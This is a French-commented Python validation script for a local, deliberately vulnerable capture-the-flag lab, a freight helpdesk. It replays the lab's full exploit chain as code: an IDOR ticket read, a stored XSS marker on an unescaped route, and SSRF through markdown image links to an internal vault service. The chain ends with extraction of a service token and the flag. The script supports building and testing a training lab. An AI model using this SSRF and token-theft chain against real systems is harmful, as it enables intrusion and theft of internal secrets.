#!/usr/bin/env python3
"""
Validation automatisée du lab Lumen Freight.

Ce script ne se contente pas de vérifier que les conteneurs tournent :
il REJOUE réellement chaque étape de la chaîne d'exploitation prévue
(reconnaissance -> IDOR -> XSS stockée -> SSRF -> secret -> exfiltration)
pour prouver que les vulnérabilités voulues sont bien présentes et
exploitables de bout en bout, et que le reste de l'application fonctionne
normalement.

Usage : python3 tests/validate_lab.py
Pré-requis : le lab doit être démarré (scripts/start.sh) et accessible
sur http://127.0.0.1:5000
"""

import sys
import uuid

import requests

BASE = "http://127.0.0.1:5000"
RESULTS = []


def check(name, condition, detail=""):
    status = "PASS" if condition else "FAIL"
    RESULTS.append((name, status, detail))
    print(f"[{status}] {name}" + (f" — {detail}" if detail and not condition else ""))
    return condition


def main():
    session = requests.Session()

    # ---- 0. Services de base ----
    try:
        r = session.get(f"{BASE}/healthz", timeout=5)
        check("Helpdesk accessible (/healthz)", r.status_code == 200, r.text)
    except requests.RequestException as e:
        check("Helpdesk accessible (/healthz)", False, str(e))
        print("\nLe lab ne semble pas démarré. Lancez scripts/start.sh d'abord.")
        sys.exit(1)

    # ---- 1. Inscription + connexion d'un compte attaquant ----
    attacker_user = f"pentest_{uuid.uuid4().hex[:6]}"
    r = session.post(
        f"{BASE}/register",
        data={"username": attacker_user, "password": "TestPass123!", "display_name": "Lab Tester"},
    )
    check("Inscription d'un compte apprenant", r.status_code in (200, 302))

    r = session.post(f"{BASE}/login", data={"username": attacker_user, "password": "TestPass123!"})
    check("Connexion du compte apprenant", r.status_code in (200, 302))

    # ---- 2. IDOR : lecture du ticket #1 (appartenant à admin.rousseau) ----
    r = session.get(f"{BASE}/tickets/1")
    idor_ok = r.status_code == 200 and "vault" in r.text.lower()
    check(
        "IDOR — lecture du ticket #1 (autre utilisateur) sans contrôle de propriété",
        idor_ok,
        f"status={r.status_code}",
    )

    # ---- 3. Stored XSS : route de debug /tickets/<id>/raw non échappée ----
    xss_payload_subject = f"XSS-check-{uuid.uuid4().hex[:6]}"
    xss_marker = "<script>window.__lab_xss_marker=1</script>"
    r = session.post(
        f"{BASE}/tickets/new",
        data={"subject": xss_payload_subject, "description": f"Test {xss_marker} fin"},
    )
    # Récupère l'ID du ticket créé depuis la redirection
    ticket_id = None
    if r.history:
        loc = r.history[-1].headers.get("Location", "") or r.url
    else:
        loc = r.url
    if "/tickets/" in loc:
        try:
            ticket_id = int(loc.rstrip("/").split("/tickets/")[-1].split("/")[0])
        except ValueError:
            ticket_id = None

    if ticket_id:
        r_normal = session.get(f"{BASE}/tickets/{ticket_id}")
        escaped_ok = xss_marker not in r_normal.text  # la vue normale doit échapper
        check("Vue normale du ticket échappe correctement le HTML", escaped_ok)

        r_raw = session.get(f"{BASE}/tickets/{ticket_id}/raw")
        raw_vulnerable = xss_marker in r_raw.text  # la route /raw ne doit PAS échapper
        check(
            "XSS stockée — /tickets/<id>/raw rend le payload sans échappement",
            raw_vulnerable,
            f"status={r_raw.status_code}",
        )
    else:
        check("Création du ticket de test XSS", False, "impossible de retrouver l'ID du ticket")

    # ---- 4. SSRF : aperçu d'image pointant vers le service interne vault ----
    ssrf_subject = f"SSRF-check-{uuid.uuid4().hex[:6]}"
    ssrf_description = "Capture d'écran jointe ![preview](http://vault:5001/internal/status)"
    r = session.post(f"{BASE}/tickets/new", data={"subject": ssrf_subject, "description": ssrf_description})
    loc = r.history[-1].headers.get("Location", "") if r.history else r.url
    ssrf_ticket_id = None
    if "/tickets/" in loc:
        try:
            ssrf_ticket_id = int(loc.rstrip("/").split("/tickets/")[-1].split("/")[0])
        except ValueError:
            ssrf_ticket_id = None

    token = None
    if ssrf_ticket_id:
        r_view = session.get(f"{BASE}/tickets/{ssrf_ticket_id}")
        ssrf_ok = "lumen-vault" in r_view.text and "token" in r_view.text
        check(
            "SSRF — l'aperçu d'image atteint le service interne vault:5001",
            ssrf_ok,
        )
        import re

        m = re.search(r'VLT-[a-f0-9]+-SERVICE-TOKEN', r_view.text)
        if m:
            token = m.group(0)
        check("Jeton de service interne exfiltré via SSRF", token is not None, "token non trouvé dans la réponse")
    else:
        check("Création du ticket de test SSRF", False, "impossible de retrouver l'ID du ticket")

    # ---- 5. Exfiltration finale via le token, toujours via le SSRF (vault non exposé à l'hôte) ----
    if token:
        final_subject = f"EXFIL-check-{uuid.uuid4().hex[:6]}"
        final_description = f"![export](http://vault:5001/internal/export?file=flag.txt&token={token})"
        r = session.post(f"{BASE}/tickets/new", data={"subject": final_subject, "description": final_description})
        loc = r.history[-1].headers.get("Location", "") if r.history else r.url
        final_id = None
        if "/tickets/" in loc:
            try:
                final_id = int(loc.rstrip("/").split("/tickets/")[-1].split("/")[0])
            except ValueError:
                final_id = None
        if final_id:
            r_final = session.get(f"{BASE}/tickets/{final_id}")
            flag_found = "LUMEN{" in r_final.text
            check("Exfiltration finale — flag récupéré depuis vault via SSRF authentifié", flag_found)
        else:
            check("Création du ticket d'exfiltration finale", False)
    else:
        check("Exfiltration finale (dépend du token SSRF)", False, "token manquant, étape précédente échouée")

    # ---- 6. Confinement réseau : vault ne doit PAS être joignable depuis l'hôte ----
    vault_unreachable = False
    try:
        requests.get("http://127.0.0.1:5001/internal/status", timeout=2)
    except requests.RequestException:
        vault_unreachable = True
    check(
        "Confinement réseau — vault inaccessible directement depuis l'hôte",
        vault_unreachable,
    )

    # ---- Résumé ----
    print("\n=== Résumé ===")
    passed = sum(1 for _, s, _ in RESULTS if s == "PASS")
    total = len(RESULTS)
    print(f"{passed}/{total} vérifications passées.")
    if passed != total:
        sys.exit(1)


if __name__ == "__main__":
    main()
